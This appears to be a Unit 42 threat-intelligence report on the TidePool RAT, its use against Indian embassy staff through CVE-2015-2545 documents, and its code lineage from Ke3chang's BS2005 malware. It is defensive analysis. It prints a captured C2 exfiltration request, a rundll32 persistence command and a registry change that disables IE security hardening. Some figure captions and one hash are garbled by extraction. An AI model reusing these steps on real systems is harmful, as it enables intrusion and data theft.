We’ve discovered a new\nmalware family we’ve named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against\nIndian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry\nof Affairs, and also conducted several prior campaigns against India.\n\nThough we don’t have comprehensive targeting information, the spear phishing emails we found targeted several Indian embassies in different\ncountries. One decoy references an annual report filed by over 30 Indian embassies across the globe. The sender addresses of the phishing\nemails spoof real people with ties to Indian embassies, adding legitimacy to the emails to prompt the recipients to open the attached file. Also\nnoteworthy, the actors are exploiting a relatively new vulnerability in their attacks with TidePool, which is detailed below.\n\nIn this report we will highlight the reuse of the code responsible for a variety of registry changes and command and control traffic over time as\nthe Ke3chang actor has evolved their codebase to TidePool since the 2013 report.\n\n## Exploitation of CVE-2015-2545\n\n[The weaponized document sent in phishing emails triggers the vulnerability outlined in CVE-2015-2545, which was first made public in](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2545)\nSeptember 2015. Unlike previously seen exploit carrier docs, this version comes packaged as an MHTML document which by default opens in\n[Microsoft Word. We have seen multiple waves of activity with similar exploit docs, including those referenced in our recent Spivy blog. PwC](https://blog.paloaltonetworks.com/2016/04/unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists/)\n[recently released a great report analyzing the exploit documents themselves. The samples we are covering are documented in the \"Windows](http://pwc.blogs.com/cyber_security_updates/2016/05/exploring-cve-2015-2545-and-its-users.html)\nUser_A\" section of their report (the malware they refer to as \"Danti Downloader\").\n\n## The TidePool Malware Family\n\nTidePool contains many capabilities common to most RATs. It allows the attacker to read, write and delete files and folders, and run\ncommands over named pipes. TidePool gathers information about the victim's computer, base64 encodes the data, and sends it to the\nCommand and Control (C2) server via HTTP, which matches capabilities of the BS2005 malware family used by the Ke3chang actor\n\nThe TidePool malware is housed in an MHTML document which exploits CVE-2015-2545. The exploit code drops a DLL into\n\n_C:\\Documents and Settings\\AllUsers\\IEHelper\\mshtml.dll_\n\nThis dropped DLL is the TidePool sample. It also launches Internet Explorer as a subprocess of the svchost service. For persistence, TidePool\nutilizes an ActiveSetup key, which will launch itself on boot with the following parameters:\n\n_rundll32.exe C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll,,IEHelper_\n\nThe TidePool sample then sends victim computer information to the C2 server, as shown in Figure 1. Once a connection is made, the sample\nbehaves as a RAT, receiving commands from the C2.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nPOST http://goback.strangled.net:443/QCLDDMGXVXESLYT HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-p\nAccept-Language: en-us\nContent-Type: multipart/form-data; boundary=----=_Part_4e67c6a7\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)\nHost: goback.strangled.net\nContent-Length: 602\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n----=_Part_4e67c6a7\nContent-Disposition: form-data; name=\"m1.jpg\"\nContent-Type: application/octet-steam\n\nWAQAAEYBAABGAQAARgEAAAAAAAAAAAAAhv0OeukKAAAVAAAAHAEAAAUAAAABAAAAKAoAAAIAAABTAGUAcgB2AGkAYwBlACAA\n\n\n**Figure 1.

One of these families is the \"BS2005\" malware family used by the\nKe3chang actor. This motivated us to dig deeper, since we had not seen any public reporting on them since 2013. From this analysis, Unit 42\ncompared the code bases of the new malware family, and the BS2005 malware samples. Based on our analysis we believe this new malware,\nwhich we are calling TidePool, is an evolution of the BS2005 malware family used by the Ke3chang actor.\n\nUnit 42 has discovered 11 similar registry modifications that both TidePool and BS2005 employ. The registry setting that TidePool and BS2005\nfocuses on is:\n\n_Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEHarden -> 0_\n\nWhen the IEHarden Value is set to 0 it disables the Internet Explorer Enhanced Security configuration, which is designed to prevent the\nexecution of scripts, ActiveX Controls, file downloads, and the Microsoft virtual machine for HTML content. This is a technique common to both\nBS2005 and TidePool malware.\n\nBelow is the routine within TidePool that modifies the IEHarden registry settings. The repetition, order, and uniqueness of the code base in this\nfunction allowed us to link TidePool back to older versions of BS2005 and Operation Ke3chang.\n\n**Figure 2. Routine to modify the IEHarden Value linking TidePool to BS2005.**\n\nCode reuse overlap also allowed us to link the various interim malware iterations between Ke3chang and TidePool together. Going over every\nsingle code overlap would be tiresome, so we'll highlight major functional similarities that allowed us to link TidePool to Operation Ke3chang. A\nlisting of similar hashes and their compile dates can be found in the IOC section at the end of this blog. They are also divided into those that\npre-date the Operation Ke3chang report and those that came after.\n\nWe compared 5 key samples that link TidePool to the original Operation Ke3chang malware. In order of comparison and usage we looked at:\n\nBS2005 Operation Ke3chang sample\n\n233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f\n\n2013 post Ke3chang\n\n\n-----\n\n0 e5 a863 0a90055 ab e e9989db8e bb 59 cd9c8c 3 c3a6 3 bc8cc\n\n2014 post Ke3chang\n\n04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05\n\n2014 post Ke3chang\n\neca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4\n\n2015 Current TidePool\n\n2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18\n\nStarting with a known Operation Ke3chang BS2005 sample, we focus on the C2 obfuscation. Figure 3 shows the routine for following 2\nsamples:\n\n233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f\n012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc\n\n**Figure 3. Comparing a BS2005 and post Ke3chang sample C2 obfuscation routine**\n\nNot only do BS2005 and TidePool share repeating registry behaviors, they also use a similar code routine to obfuscate the C2. Further\nanalysis shows that they also share similar Base64 string handling. This routine goes back even further to MyWeb malware samples, also\nassociated with Operation Ke3chang.\n\nNext we compared the codebase for setting registry keys. The code reuse displayed in Figure 4 is the sequence that sets the IEHarden\nregistry keys and other keys used throughout TidePool and Operation Ke3chang malware.\n\n012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc\n04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05\n\n**Figure 4. Sequence that sets the IEHarden registry keys and other keys used in TidePool and Operation Ke3chang samples.**\n\nThe code that handles URL beacon creation is shown in Figure 5. These functions also displayed quite a bit of code reuse.\n\neca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4\n012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc\n\n\n-----\n\n**gu e 5 Co** **pa** **g code b oc s espo s b e o U** **c eat o**\n\nFinally, we compared the following two samples.\n\n04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05\n2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18\n\nThese samples are quite similar when looking at the library functions used, but the most notable features they have in common are the timeline\nof behaviors executed. Ke3chang and TidePool both modify the IEHarden registry key, as well as the following list of keys. Setting these\nregistry keys is unique to the Ke3chang and TidePool malware families.\n\nHKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Check_Associations\n\nHKCU\\Software\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEharden\n\n## A Few Words On Attribution\n\nAttribution is an inexact process, however we have compiled several interesting findings which lend themselves to our conclusion that this\nactivity and malware is related to the original Operation Ke3chang.\n\nStrong behavioral overlap between the TidePool malware family and malware called BS2005 utilized by Operation Ke3chang\nStrong code reuse and overlap showing a branching and evolution of malware from BS2005 to TidePool.\nTargeting and attack method matches historic Ke3chang targeting.\nWhen binaries included resources, encoding was 0x04 (LANG_CHINESE) indicating the actor’s system is likely running an operating\nsystem and software with Chinese as the default display language.\n\n## Conclusion\n\nDespite going unreported on since 2013, Operation Ke3chang has not ceased operations and in fact continued developing its malware. Unit 42\nwas able to track the evolution of Operation Ke3chang’s tools by observing unique behavioral quirks common throughout the malware’s\nlineage. By pivoting on these behaviors in AutoFocus, we were able to assess a relationship between these families dating back to at least\n2012 and the creation of TidePool, a new malware family continuing in Ke3chang’s custom malware footsteps. While we can’t know all of the\ngroups’ attacks using TidePool or older malware, we have uncovered its use against Indian Embassies, which was also documented in the\n2013 report, indicating this is likely a high priority target as it has continued over multiple years.\n\n[Customers can utilize the Ke3changResurfaces AutoFocus tag to examine the samples discussed in this post.
